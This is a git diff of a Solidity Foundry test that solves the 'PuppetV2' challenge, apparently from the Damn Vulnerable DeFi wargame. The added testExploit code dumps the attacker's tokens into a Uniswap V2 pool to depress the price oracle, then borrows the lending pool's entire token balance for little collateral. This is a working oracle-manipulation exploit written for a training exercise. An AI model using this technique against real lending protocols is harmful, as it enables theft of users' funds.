@@ -37,7 +37,7 @@ interface UniswapV2Pair {
 interface UniswapV2Router02 {
     // function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline) external returns (uint256, uint256, uint256);
     function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256, uint256, uint256);
-
+    function swapExactTokensForETH(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory);
 
 }
 
@@ -161,7 +161,32 @@ contract PuppetV2 is DSTest, stdCheats {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
 
+
+        dvt.approve(address(uniswapV2Router), 2** 256 - 1);
+
+
+        address[] memory paths = new address[](2);
+        paths[0] = address(dvt);
+        paths[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForETH(
+            dvt.balanceOf(attacker),
+            0,
+            paths,
+            attacker,
+            DEADLINE
+        );
+
+        weth.deposit{value: attacker.balance}();
+
+        weth.approve(address(puppetV2Pool), 2** 256 - 1);
+
+        puppetV2Pool.borrow( dvt.balanceOf(address(puppetV2Pool)));
+
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
